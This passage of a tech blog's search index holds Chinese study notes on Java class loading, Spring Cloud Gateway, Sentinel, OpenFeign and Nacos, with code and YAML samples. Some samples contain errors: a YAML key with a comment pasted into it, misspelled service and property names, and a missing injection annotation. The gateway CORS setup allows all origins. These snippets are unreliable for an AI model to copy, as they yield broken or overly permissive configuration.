//3.n3是常量，他和静态变量不一样，因为一旦赋值就不变，n3 = 30 public int n1 = 10; public static int n2 = 20; public static final int n3 = 30; } 解析阶段 虚拟机将常量池内的符号引用替换为直接引用的过程\n3.3.3.初始化阶段 到初始化阶段才真正开始执行类中定义的Java程序代码，此阶段是执行()方法的过程。\n()方法由编译器**按语句在源文件中出现的顺序，依次收集类中所有静态变量的赋值动作和静态代码块中**的语句，并进行合并\n虚拟机会保证一个类的()方法在多线程环境中被正确的加锁，同步，如果多个线程同时去初始化一个类，那么只会有一个线程去执行这个类的()方法\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 package com.edu.ClassLoad; /* * 类加载初始化阶段 * */ public class ClassLoad3 { public static void main(String[] args) { //1.加载B类，并生成 B的class对象 //2.连接 num = 0; //3.初始化阶段：依次收集类中所有静态变量的赋值动作和静态代码块中的语句,并合并 //client(){ // static { // System.out.println(\u0026#34;B 的静态代码块被执行\u0026#34;); // num = 300; // num = 100; // } //合并之后num=100 // } //new B(); System.out.println(B.num); } } class B{ static { System.out.println(\u0026#34;B 的静态代码块被执行\u0026#34;); num = 300; } static int num = 100; public B(){ //构造器不会执行，除非你new 了B这个对象才会执行 System.out.println(\u0026#34;B 的构造器被执行\u0026#34;); } } ","date":"2025-06-09T12:42:31+08:00","image":"https://lserein.github.io/p/java%E5%8F%8D%E5%B0%84/logo_hu_73624af09b12cc7e.png","permalink":"https://lserein.github.io/p/java%E5%8F%8D%E5%B0%84/","title":"Java反射"},{"content":"\n1.创建网关模块 1 2 3 4 5 6 7 8 9 10 \u0026lt;dependencies\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.cloud\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-cloud-starter-gateway\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alibaba.cloud\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-cloud-starter-alibaba-nacos-discovery\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;/dependencies\u0026gt; 2.配置规则 需**求1：客户端发送/api/order/转到service-order\n**需求2：客户端发送/api/product/转到service-product\n需求3：以上转发均有负载均衡效果\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 spring: cloud: gateway: routes: # - id: service_a - id: order-route uri: lb://service-order predicates：当请求路径以 /api/product/ 开头时，请求会被路由到 service-product 服务: # - Path=/service-a/** - Path=/api/order/** - id: product-route uri: lb://serivce-product predicates: # - Path=/service-a/** - Path=/api/product/** //id：唯一标识这个路由规则 //uri：lb://service-order //表示使用 Spring Cloud LoadBalancer 进行客户端负载均衡 //service-order是服务注册中心中的服务名 //predicates：当请求路径以 /api/product/ 开头时，请求会被路由到 service-product 服务 这些路由规则有自己的执行循序：默认从上往下执行，如果想要执行更快可以使用order: 1规定执行顺序 1 2 3 4 5 6 7 8 9 10 11 12 - id: bingo-route # 路由的唯一标识符 uri: https://www.bing.com # 目标URL（直接转发到Bing） predicates: # 路由匹配条件 - name: Path # 第一个条件：路径匹配 args: pattern: /search # 只匹配以/search开头的路径 - name: Query # 第二个条件：查询参数匹配 args: param: q # 检查名为\u0026#34;q\u0026#34;的查询参数 regex: haha # 该参数值必须匹配正则表达式\u0026#34;haha\u0026#34; 这个规则表示只有请求路径为：search?q=haha请求才会被转发到bing.com中 2.1.自定义断言工厂 1.一个类的名字要写成xxxRoutePredicateFactory.Config，并且要继承AbstractRoutePredicateFactory，泛型为类名\n2.必须重写父类的shortcutFieldOrder和apply方法，apply方法代码逻辑主要写业务代码逻辑\n如以下代码是判断用户是否为vip用户的业务逻辑\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 package com.example.gateway.predicate; import jakarta.validation.constraints.NotEmpty; import org.springframework.cloud.gateway.handler.predicate.AbstractRoutePredicateFactory; import org.springframework.cloud.gateway.handler.predicate.GatewayPredicate; import org.springframework.http.server.reactive.ServerHttpRequest; import org.springframework.stereotype.Component; import org.springframework.util.StringUtils; import org.springframework.web.server.ServerWebExchange; import java.util.Arrays; import java.util.List; import java.util.function.Predicate; @Component public class VipRoutePredicateFactory extends AbstractRoutePredicateFactory\u0026lt;VipRoutePredicateFactory.Config\u0026gt; { public VipRoutePredicateFactory() { super(Config.class); } @Override public List\u0026lt;String\u0026gt; shortcutFieldOrder() { return Arrays.asList(\u0026#34;param\u0026#34;,\u0026#34;value\u0026#34;); } @Override public Predicate\u0026lt;ServerWebExchange\u0026gt; apply(Config config) { return new GatewayPredicate() { @Override public boolean test(ServerWebExchange exchange) { //localhost/search?q=haha\u0026amp;user=Lsec ServerHttpRequest request = exchange.getRequest(); String first = request.getQueryParams().getFirst(config.getParam()); if (StringUtils.hasText(first) \u0026amp;\u0026amp; first.equals(config.getValue())) { return true; } return false; } }; } /* * 可以配置的参数 * */ public static class Config{ @NotEmpty private String param; @NotEmpty private String value; public String getParam() { return param; } public void setParam(String param) { this.param = param; } public String getValue() { return value; } public void setValue(String value) { this.value = value; } } } //配置文件规则 - name: Vip args: param: user value: Lsec 3.Filter过滤器 3.1.过滤器Filter基本使用 **路径重写Filter：**RewritePath，什么是路径重写，当你想使用/api/product这个基准路径访问业务时，需要在product模块的controller层代码添加对应的基准路径，有时你会觉得不方便，如果使用路径重写filter，你就可以不用在controller层添加基准路径的api，直接访问即可\n1 2 3 4 5 6 7 8 9 - id: product-route uri: lb://serivce-product predicates: # - Path=/service-a/** - Path=/api/product/** filters: - RewritePath=/api/product/?(?\u0026lt;segment\u0026gt;.*),/$\\{segment} //修改请求的路径后再转发到目标服务 //请求 /api/product/123 → 重写为 /123 → 转发到 service-product/123 //请求 /api/product/items → 重写为 /items → 转发到 service-product/items **添加请求头响应头Filter：**AddRequestHeader/AddResponseHeader\n1 2 3 4 5 6 7 8 9 10 11 12 spring: cloud: gateway: routes: # - id: service_a - id: order-route uri: lb://service-order predicates: # - Path=/service-a/** - Path=/api/order/** filters: - RewritePath=/api/order/?(?\u0026lt;segment\u0026gt;.*),/$\\{segment} - AddRequestHeader=X-Response-ABC, 123 - AddResponseHeader=X-Response-Foo, Bar 就是在请求包中添加请求头和响应头\n3.2.默认Filter 如果你的路由没有写Filter，但是存在默认Filter，路由默认会使用这个Filter\n1 2 3 4 5 default-filters: - name: AddRequestHeader args: name: X-Request-Foo value: Bar 3.3.全局Filter 想要实现全局filter，需要在实现GlobalFilter，并且重写filter方法\n下面是一个计算请求时间的全局过滤器\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 package com.example.gateway.filter; import lombok.extern.slf4j.Slf4j; import org.slf4j.Logger; import org.slf4j.LoggerFactory; import org.springframework.cloud.gateway.filter.GatewayFilterChain; import org.springframework.cloud.gateway.filter.GlobalFilter; import org.springframework.http.server.reactive.ServerHttpRequest; import org.springframework.http.server.reactive.ServerHttpResponse; import org.springframework.stereotype.Component; import org.springframework.web.server.ServerWebExchange; import reactor.core.publisher.Mono; @Slf4j @Component public class RtGlobalFilter implements GlobalFilter { @Override public Mono\u0026lt;Void\u0026gt; filter(ServerWebExchange exchange, GatewayFilterChain chain) { ServerHttpRequest request = exchange.getRequest(); ServerHttpResponse response = exchange.getResponse(); String uri = request.getURI().toString(); long start = System.currentTimeMillis(); log.info(\u0026#34;请求开始，uri：{},时间：{}ms\u0026#34;, uri, start); /*==============================================*/ Mono\u0026lt;Void\u0026gt; filter = chain.filter(exchange) .doFinally(result -\u0026gt; { long end = System.currentTimeMillis(); log.info(\u0026#34;请求结束，uri：{},时间：{}ms\u0026#34;, uri, (end - start)); }); return filter; } } 3.4.自定义过滤器工厂 自定义过滤器工厂和自定义断言工厂一样，可以看Spring Cloud自带的过滤器工厂是怎么设置的，根据样式仿写即可\n可以看到系统的工厂需要继承AbstractNameValueGatewayFilterFactory这个父类工厂，并重写apply方法\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 package com.example.gateway.filter; import org.springframework.cloud.gateway.filter.GatewayFilter; import org.springframework.cloud.gateway.filter.factory.AbstractGatewayFilterFactory; import org.springframework.http.HttpHeaders; import org.springframework.http.server.reactive.ServerHttpResponse; import org.springframework.stereotype.Component; import reactor.core.publisher.Mono; import java.util.UUID; @Component public class OnceTokenGatewayFilterFactory extends AbstractGatewayFilterFactory\u0026lt;OnceTokenGatewayFilterFactory.Config\u0026gt; { public OnceTokenGatewayFilterFactory() { super(Config.class); } @Override public GatewayFilter apply(Config config) { return (exchange, chain) -\u0026gt; chain.filter(exchange).then(Mono.fromRunnable(() -\u0026gt; { ServerHttpResponse response = exchange.getResponse(); HttpHeaders headers = response.getHeaders(); String value = config.getValue(); if (value == null || value.isEmpty()) { value = UUID.randomUUID().toString(); // 默认生成 UUID } else if (value.equals(\u0026#34;uuid\u0026#34;)) { value = UUID.randomUUID().toString(); } else if (value.equals(\u0026#34;jwt\u0026#34;)) { value = \u0026#34;jwt_token\u0026#34;; } headers.add(\u0026#34;once-token\u0026#34;, value); })); } public static class Config { private String value; // 移除 @NotEmpty public String getValue() { return value; } public void setValue(String value) { this.value = value; } } } 4.全局跨域（CORS） 4.1.什么是跨域 1 2 3 4 5 6 7 8 spring: cloud: gateway: globalcors: cors-configurations: \u0026#39;[/**]\u0026#39;: # 匹配所有请求 allowedOrigins: \u0026#34;*\u0026#34; #跨域处理 允许所有的域 allowedMethods: \u0026#34;*\u0026#34;# 支持的方法 经典面试题：微服务之间的调用是否经过网关\n默认是不经过网关的，但是也可以经过网关，只需要将远程调用的地址改为网关地址，让网关来发送请求即可\n","date":"2025-06-09T12:30:52+08:00","image":"https://lserein.github.io/p/gateway/gateway_hu_4c187a95a9d45d87.jpg","permalink":"https://lserein.github.io/p/gateway/","title":"Gateway"},{"content":"1.Sentinel工作原理 学习Sentinel关注3点\n1.如何定义资源 2.如何定义规则 3.如何处理规则 2.下载Sentinel客户端 home | Sentinel\n下载连接：https://github.com/alibaba/Sentinel/releases/tag/1.8.8\n1 java -jar sentinel-dashboard-1.8.8.jar 启动后访问127.0.0.1:8080端口，默认账户密码为sentinel:sentinel\n3.Sentinel结合业务 导入Sentinel依赖\n1 2 3 4 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alibaba.cloud\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-cloud-starter-alibaba-sentinel\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; 编辑配置文件连接Sentinel服务器地址\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 spring: cloud: openfeign: client: config: product-service: # 只针对product-service服务的配置 connect-timeout: 5000 # 连接超时时间 read-timeout: 5000 # 读取超时时间 logger-level: full # 日志级别 default: # 所有其它服务的默认配置 connect-timeout: 5000 # 连接超时时间 read-timeout: 10000 # 读取超时时间 logger-level: full # 日志级别 Sentinel: transport: dashboard: localhost:8080 # sentinel控制台地址 eager: true # 启动时就初始化sentinel规则 此时启动项目就连接成功\n那么如何通过Sentinel实现监控呢，在你需要监控的资源上加上@SentinelResource注解表示这个方法是Sentinel监控的资源\n此时如果我们请求这个路由，Sentinel就会接收到这个请求，根据我们在Sentinel上定义的规则对请求进行拦截或放行\n通过Sentinel定义流控规则限制并发数，此时我限制每次发送的请求最多为1次\n当我访问过快时，业务端直接报错\n4.Sentinel异常处理 Web异常自定义处理异常 由于默认的异常处理是Sentinel的默认错误页，如果我们想对这个异常处理进行优化该怎么操作呢\n想要异常处理为自己定义的就要自己写一个BlockExceptionHandler\n在模型层定义一个处理异常的JavaBean，给上构造方法\n定义一个处理异常的类MyExceptionHandler实现BlockExceptionHandler方法，重写里面的handle方法\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 package com.example.exception; import com.alibaba.csp.sentinel.adapter.spring.webmvc_v6x.callback.BlockExceptionHandler; import com.alibaba.csp.sentinel.slots.block.BlockException; import com.example.bean.common.R; import com.fasterxml.jackson.databind.ObjectMapper; import jakarta.servlet.http.HttpServletRequest; import jakarta.servlet.http.HttpServletResponse; import org.springframework.stereotype.Component; import java.io.PrintWriter; @Component public class MyExceptionHandler implements BlockExceptionHandler { private ObjectMapper objectMapper = new ObjectMapper(); @Override public void handle(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse, String s, BlockException e) throws Exception { httpServletResponse.setCharacterEncoding(\u0026#34;UTF-8\u0026#34;); httpServletResponse.setContentType(\u0026#34;application/json\u0026#34;); PrintWriter writer = httpServletResponse.getWriter(); R error = R.error(500, \u0026#34;系统繁忙，请稍后再试\u0026#34;); String json = objectMapper.writeValueAsString(error); writer.write(json); } } 4.4.2.@SentinelResource异常处理器 一句话总结：@SentinelResource如果标注了blockhandler注解，那就是由blockhandler处理异常，如果没有标注blockhandler属性标注了fallback属性，那么就是由fallback来处理异常，如果一个属性都没有标只取了个名字，那么异常就会没人管向上抛出，最好由SpringBoot来进行处理\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 //当请求符合Sentinel的要求时，直接走CreateOrder方法并返回真实数据 //当请求不符合Sentinel的规则时，会走blockHandler中的CreateOrderBlockHandler方法，并调用兜底回调 @Override @SentinelResource(value = \u0026#34;createOrder\u0026#34;, blockHandler = \u0026#34;CreateOrderBlockHandler\u0026#34;) public order CreateOrder(Long userId, Long productId) { order order = new order(); product product = productFeignClient.getProductById(productId); //product product = getProductFromRemote2(productId); order.setId(1L); //计算订单总金额 order.setTotalAmount(product.getPrice().multiply(new BigDecimal(\u0026#34;10\u0026#34;))); order.setUserId(userId); order.setNikeName(\u0026#34;zhangsan\u0026#34;); order.setAddress(\u0026#34;beijing\u0026#34;); //远程查询商品信息，并设置到订单中 order.setProductList(Arrays.asList(product)); return order; } public order CreateOrderBlockHandler(Long userId, Long productId, BlockException e) { order order = new order(); order.setId(0L); //计算订单总金额 order.setTotalAmount(new BigDecimal(\u0026#34;0\u0026#34;)); order.setUserId(userId); order.setNikeName(\u0026#34;未知用户\u0026#34;); order.setAddress(\u0026#34;异常信息\u0026#34;+e.getMessage()); return order; } 4.4.3.OpenFeign调用 可以从链路数据中看出链路一直到达OpenFeign远程调用地址，如果我们在远程调用地址上添加流控会发生什么呢\n当请求过快时会看到页面返回OpenFeign兜底回调数据，原因是我们之前在OpenFeign接口上写过兜底回调fallback，如果请求失败并且项目中有兜底数据，那么就会显示兜底数据，如果没有写兜底回调，那么就会往上抛，知道SpringBoot来进行处理\n4.4.4.Sphu硬编码方式处理异常 1 2 3 4 5 6 7 try { SphU.entry(\u0026#34;createOrder\u0026#34;); //项目原生代码 } catch (BlockException e) { //进行异常处理逻辑，比如返回默认值或者抛出异常等 throw new RuntimeException(e); } 5.Sentinel流控规则 阈值类型：QPS和并发线程数的区别\nQPS：指每秒允许通过的请求数量，基于时间窗口统计，底层采用计数器来计数\n并发线程数：适用于代码中使用了线程池，比较复杂，也是每秒运行通过的请求数量\n集群阈值模式：\n单机均摊：假设总请求为30，有3个集群，那么每个集群均摊10个请求\n总体阈值：假设总体阈值请求为10，有3个集群，那么每个集群处理3个请求\n5.1.流控模式（直接/关联/链路） 链路规则 比如有这样一个场景：订单创建时分为普通创建订单和秒杀创建订单两种情况，我在createOrder资源中流控模式选择链路模式，入口资源选择秒杀创建订单资源名，那么当请求过快时，普通创建订单不受影响，秒杀创建订单会加载兜底数据\n关联规则 当系统中两个资源存在竞争关系时通常使用关联规则\n当writedb的流量特别大时，readdb才会被限制\n5.2.流控效果（快速失败/Warm up/排队等待） 快速失败 当请求流量超出阈值规则时，多余的请求直接会抛出异常\nWarm Up（预热/冷启动） 匀速排队 以前超过的请求都是直接丢掉，匀速排队中多出来的请求一个一个排队，当排队市场超过预期时间，请求就会被丢弃\n6.熔断规则 断路器工作原理\n6.1.慢调用比例 解释一下这张图：\n5秒内所有响应超过1秒的请求都为慢调用请求，如果慢调用请求超过总请求的80%，那么这个请求是不可靠的，那么断路器会熔断30S,这30S期间所有请求均返回错误\n6.2.异常比例 5秒内向远程发送请求，如果有80%请求出现异常，那么断路器会打开熔断20秒，这20秒不会在给远程发送请求\n6.3.异常数 5秒内不管你发送多少请求，只要你请求中有10个存在异常，那么就直接触发熔断规则\n7.热点规则 parameter-flow-control | Sentinel\n何为热点？热点即经常访问的数据。很多时候我们希望统计某个热点数据中访问频次最高的 Top K 数据，并对其访问进行限制。比如：\n商品 ID 为参数，统计一段时间内最常购买的商品 ID 并进行限制 用户 ID 为参数，针对一段时间内频繁访问的用户 ID 进行限制 热点参数限流会统计传入参数中的热点参数，并根据配置的限流阈值与模式，对包含热点参数的资源调用进行限流。热点参数限流可以看做是一种特殊的流量控制，仅对包含热点参数的资源调用生效。\n1 2 3 普通用户秒杀QPS不超过1 vip用户秒杀QPS不限制 666号是下架商品，不允许访问 参数索引这第一个0方法签名的表示第一个参数，单机阈值表示参数的个数\n高级选项中参数值为6表示userId为6的用户不限流\n当服务重启后Sentinel中的所有规则都会失效，如果想要持久化，可以结合Nacos和Mysql数据库实现持久化\n","date":"2025-06-08T23:44:41+08:00","image":"https://lserein.github.io/p/sentinel/Sentinel_hu_2c5df63c709ebee8.jpg","permalink":"https://lserein.github.io/p/sentinel/","title":"Sentinel"},{"content":"OpenFeign\u0026mdash;远程调用 使用OpenFeign进行远程调用 向第三方微服务API发送请求 小Tips：向自己的业务API发送请求直接复制对方业务Controller层方法即可\n前面使用的是restTemplate进行远程调用，但是使用restTemplate进行远程调用比较麻烦，这里我们使用OpenFeign改写代码\n导入依赖，创建ProductFeignClient接口\n1 2 3 4 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.cloud\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-cloud-starter-openfeign\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 restTemplate package com.example.feign; import com.example.bean.product; import org.springframework.cloud.openfeign.FeignClient; import org.springframework.web.bind.annotation.GetMapping; import org.springframework.web.bind.annotation.PathVariable; @FeignClient(value = \u0026#34;product-service\u0026#34;) //Feign客户端，指定要请求的服务名称 public interface ProductFeignClient { //MVC注解两套逻辑 //标注在controller上，是接收http请求 //标注在feign上，是用来发送http请求 @GetMapping(\u0026#34;/product/{productId}\u0026#34;) //指定远程服务接口 product getProductById(@PathVariable(\u0026#34;productId\u0026#34;) Long productId); } 将ProductFeignClient进行依赖注入\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 @Autowired ProductFeignClient productFeignClient; @Override public order CreateOrder(Long userId, Long productId) { order order = new order(); //调用接口的方法发送请求 product product = productFeignClient.getProductById(productId); //不需要自己在写getProductFromRemote2方法 //product product = getProductFromRemote2(productId); order.setId(1L); //计算订单总金额 order.setTotalAmount(product.getPrice().multiply(new BigDecimal(\u0026#34;10\u0026#34;))); order.setUserId(userId); order.setNikeName(\u0026#34;zhangsan\u0026#34;); order.setAddress(\u0026#34;beijing\u0026#34;); //远程查询商品信息，并设置到订单中 order.setProductList(Arrays.asList(product)); return order; } 第三方API远程调用 比如我不需要像注册中心发请求，我想像第三方API发送请求，如：墨迹天气等等\n使用FeignClient绑定第三方API的URL，根据对应请求方法发送对应请求\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 package com.example.feign; import org.springframework.cloud.openfeign.FeignClient; import org.springframework.web.bind.annotation.GetMapping; import org.springframework.web.bind.annotation.RequestParam; //https://v.api.aa1.cn/api/api-tianqi-3/index.php?msg=%E5%A4%A9%E6%B4%A5\u0026amp;type=1 @FeignClient(value = \u0026#34;weather\u0026#34;,url = \u0026#34;https://v.api.aa1.cn/api/api-tianqi-3/index.php\u0026#34;) public interface WeatherFeignClient { @GetMapping(\u0026#34;/api/api-tianqi-3/index.php\u0026#34;) String getWeather(@RequestParam(\u0026#34;msg\u0026#34;) String msg, @RequestParam(\u0026#34;type\u0026#34;) String type); } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 package com.example; import com.example.feign.WeatherFeignClient; import org.junit.jupiter.api.Test; import org.springframework.beans.factory.annotation.Autowired; import org.springframework.boot.test.context.SpringBootTest; @SpringBootTest public class WeatherTest { @Autowired WeatherFeignClient weatherFeignClient; @Test void test(){ String weather = weatherFeignClient.getWeather(\u0026#34;北京\u0026#34;, \u0026#34;1\u0026#34;); System.out.println(weather); } } 客户端负载均衡与服务端负载均衡？\nOpenFeign进阶配置 开启请求日志功能 在yml配置文件中配置日志的范围\n1 2 3 logging: level: com.example.feign: debug 在config配置类中配置一个Bean\n1 2 3 4 @Bean Logger.Level feignLoggerLevel() { return Logger.Level.FULL; } 再次运行测试类，请求的详细信息（请求方法，路径，参数都会展示）\n超时控制 超时有两种超时，连接超时（默认10秒）和读取超时（默认60秒）\n可以新创建一个配置文件，如果其它配置文件想要使用这个配置文件的话只需要引用即可\n1 2 3 4 5 6 7 8 9 10 11 12 13 spring: cloud: openfeign: client: config: product-service: # 只针对product-service服务的配置 connect-timeout: 10000 # 连接超时时间 read-timeout: 10000 # 读取超时时间 logger-level: full # 日志级别 default: # 所有其它服务的默认配置 connect-timeout: 20000 # 连接超时时间 read-timeout: 30000 # 读取超时时间 logger-level: full # 日志级别 重试机制 在config配置类中自定义一个重试器retryer，Spring提供默认的retryer，默认最大重试5次，每次最大间隔1秒\n1 2 3 4 5 @Bean Retryer retryer() { //最多重试3次，每次最大间隔10秒，最小间隔1秒 return new Retryer.Default(1000, 10000, 3); } 拦截器 创建好后可以将这个拦截器在配置文件中声明也可以将它设置为Bean，自动调用拦截\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 package com.example.interceptor; import feign.RequestInterceptor; import feign.RequestTemplate; import org.springframework.stereotype.Component; import java.util.UUID; @Component public class TokenRequestInterceptor implements RequestInterceptor { /* * 请求拦截器需要实现RequestInterceptor接口的apply方法 * 该方法会在请求发送之前被调用 * 可以在该方法中添加请求头、请求参数等 * 这里我们可以通过RequestTemplate对象来添加请求头 * 例如：requestTemplate.header(\u0026#34;Authorization\u0026#34;, \u0026#34;Bearer \u0026#34; + token); * */ @Override public void apply(RequestTemplate requestTemplate) { System.out.println(\u0026#34;拦截器执行了\u0026#34;); requestTemplate.header(\u0026#34;Authorization\u0026#34;, UUID.randomUUID().toString()); } } Fallback兜底返回 使用Fallback兜底返回机制需要引入sentinel依赖\n1 2 3 4 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alibaba.cloud\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-cloud-starter-alibaba-sentinel\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; 在配置文件中将feign.sentinel.enable设置为true\n1 2 3 feign: sentinel: enabled: true # 开启feign对sentinel的支持 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 package com.example.feign.fallback; import com.example.bean.product; import com.example.feign.ProductFeignClient; import org.springframework.stereotype.Component; import java.math.BigDecimal; @Component public class ProductFeignClientFallback implements ProductFeignClient { @Override public product getProductById(Long productId) { System.out.println(\u0026#34;兜底回调\u0026#34;); product product = new product(); product.setId(productId); product.setProductName(\u0026#34;兜底回调商品\u0026#34;); product.setPrice(new BigDecimal(\u0026#34;1000.00\u0026#34;)); product.setNum(10); return product; } } 如果正常请求无法完成请求，那么会走兜底回调方法，返回默认数据\n","date":"2025-06-08T15:08:01+08:00","image":"https://lserein.github.io/p/openfeign/OpenFeign_hu_f854ac1c3ea4ac46.jpg","permalink":"https://lserein.github.io/p/openfeign/","title":"OpenFeign"},{"content":"Nacos\u0026mdash;注册中心\u0026amp;配置中心 Nacos官网| Nacos 配置中心 | Nacos 下载| Nacos 官方社区\n什么是注册中心Nacos Nacos两大核心功能：服务注册与服务发现\n安装Nacos https://nacos.io/download/release-history/?spm=5238cd80.2ef5001f.0.0.3f613b7c4NDiBh\n直接下载zip压缩包，解压后运行即可\n1 startup.cmd -m standalone 访问:http://127.0.0.1:8848/nacos\nNacos服务注册功能 启动微服务 在service-order微服务模块中写一个SpringBoot的启动类\n创建配置文件application.properties\n1 2 3 spring.application.name=service-order //服务名称 sercer.port=8000 //服务启动端口 spring.cloud.nacos.server-addr=127.0.0.1:8848 //nacos地址 此时访问本地nacos服务器，发现nacos中存在service-order即注册成功\n集群模式启动测试 控制台右键复制配置\n编辑配置，将端口改一下运行即可，如下图所示\n此时nacos注册中心实例数就有3个了\nNacos服务发现 开启服务发现功能 在SpringBoot的启动类中添加注解@EnableDiscoveryClient\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 package com.example; import org.springframework.boot.SpringApplication; import org.springframework.boot.autoconfigure.SpringBootApplication; import org.springframework.cloud.client.discovery.EnableDiscoveryClient; @EnableDiscoveryClient //开启服务注册与发现功能 @SpringBootApplication public class ProductApplication { public static void main(String[] args) { SpringApplication.run(ProductApplication.class, args); } } 测试服务发现API 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 @SpringBootTest public class productTest { @Autowired DiscoveryClient discoveryClient; @Test public void discoveryClient() { // 服务注册与发现功能的测试代码 discoveryClient.getServices().forEach(service -\u0026gt; System.out.println(\u0026#34;service\u0026#34;+service) ); //获取服务的IP和端口信息 discoveryClient.getInstances(\u0026#34;product-service\u0026#34;).forEach(instance -\u0026gt; System.out.println(\u0026#34;instance\u0026#34;+instance.getHost()+\u0026#34;\\n\u0026#34;+instance.getPort()+\u0026#34;\\n\u0026#34;+instance.getUri()) ); } } 使用nacosServiceDiscovery进行服务发现测试 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 @Autowired NacosServiceDiscovery nacosServiceDiscovery; //获取服务信息 @Test void nacosServiceDiscovery() throws NacosException { // 服务注册与发现功能的测试代码 nacosServiceDiscovery.getServices().forEach(service -\u0026gt; System.out.println(\u0026#34;service\u0026#34;+service) ); //获取服务的IP和端口信息 nacosServiceDiscovery.getInstances(\u0026#34;product-service\u0026#34;).forEach(instance -\u0026gt; System.out.println(\u0026#34;instance\u0026#34;+instance.getHost()+\u0026#34;\\n\u0026#34;+instance.getPort()) ); } 4.远程调用\u0026mdash;下单场景 远程调用基本流程\n首先要定义两个微服务模块，分别是order模块和product模块，分别在这两个模块中编写对应的逻辑代码，这两个模块不需要写实体类pojo，将所有微服务的实体类抽取出来放到model模块统一管理\norder和product模块要使用实体类直接在pom文件中加载依赖即可，如果不这样做的话如果订单模块要使用product模块就会很麻烦\n负载均衡API测试 根据配置的策略从可用实例中选择一个，默认使用轮询算法，这次调用9001，下次调用9002，在又是9001\n1 2 3 4 5 //在order的pom文件中引入对应依赖 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.cloud\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-cloud-starter-loadbalancer\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 @SpringBootTest public class LoadBalancerTest { LoadBalancerClient loadBalancerClient; @Test public void test(){ ServiceInstance choose = loadBalancerClient.choose(\u0026#34;product-service\u0026#34;); System.out.println(choose.getHost()+\u0026#34;:\u0026#34;+choose.getPort()); ServiceInstance choose1 = loadBalancerClient.choose(\u0026#34;product-service\u0026#34;); System.out.println(choose1.getHost()+\u0026#34;:\u0026#34;+choose1.getPort()); ServiceInstance choose2 = loadBalancerClient.choose(\u0026#34;product-service\u0026#34;); System.out.println(choose2.getHost()+\u0026#34;:\u0026#34;+choose2.getPort()); } } 使用@LoadBanlancer注解完成负载均衡调用 1 2 3 4 5 6 //将注解放到远程调用客户端上即可 @LoadBalanced @Bean public RestTemplate restTemplate() { return new RestTemplate(); } 1 2 3 4 5 6 7 8 9 10 private product getProductFromRemote2(Long productId) { // 1. 获取商品服务所在的 IP 地址 // 2. 构造请求 URL，product-service微服务的IP地址 String url = \u0026#34;http://product-service/product/\u0026#34; + productId; // 3. 发送请求，获取商品信息 log.info(\u0026#34;请求URL: {}\u0026#34;, url); product product = restTemplate.getForObject(url, product.class); return product; } **面试题：**注册中心Nacos如果宕机，那么还能成功完成远程调用吗？\n1.注册中心如果宕机，以前调用过那么可以从示例缓存中获取IP地址，还能成功完成远程调用\n2.注册中心宕机，如果以前没调用过，那么第一次需要在注册中心获取地址，不能完成远程调用\nNacos配置中心 动态刷新 1 @Value(\u0026#34;${xxx}\u0026#34;)获取配置+@RefreshScope实现自动刷新 项目中使用方法：\n1.启动Nacos\n2.导入Nacos作为配置中心的依赖\n1 2 3 4 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alibaba.cloud\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-cloud-starter-alibaba-nacos-config\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; 3.在配置文件properties编写配置\n1 2 3 4 spring.application.name=service-order sercer.port=8000 spring.cloud.nacos.server-addr=127.0.0.1:8848 spring.config.import=nacos:service-order.properties //指定导入的配置文件 